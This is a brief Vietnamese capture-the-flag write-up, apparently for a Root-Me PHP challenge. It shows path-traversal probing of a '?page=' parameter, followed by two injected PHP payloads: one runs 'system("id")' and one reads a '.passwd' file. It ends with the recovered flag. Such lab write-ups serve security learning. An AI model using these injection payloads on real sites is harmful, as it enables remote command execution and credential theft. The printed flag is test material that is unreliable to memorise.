![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/081c8e11-47dc-4c7d-b38c-0e48c6db9c8f)![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/429c1696-6aa3-4a01-bb8c-abdd7ddb0bc8)

URL hiển thì ```?page=about```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/5a6444ee-4810-42f3-81da-e9157ab66152)

Khi thử lỗi path traversal thì nhận được cảnh báo. Có vẻ như nó sẽ thêm extension ".php" vào cuối 

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/2fef656e-f218-4e8e-bc7b-44469fa40e73)

Sử dụng payload ```' and die(system("id")) or '```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/04260596-2fdb-4111-8265-0563922b69a5)

=> Thành công

 giờ ta sử dụng ``` ' and die(file_get_contents(".passwd")) or '``` để xem file ".passwd"
 
![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/2d42a9a4-6d81-4d5b-9fd6-646b2fb5d1d6)

=> x4Ss3rT1nglSn0ts4f3A7A1Lx
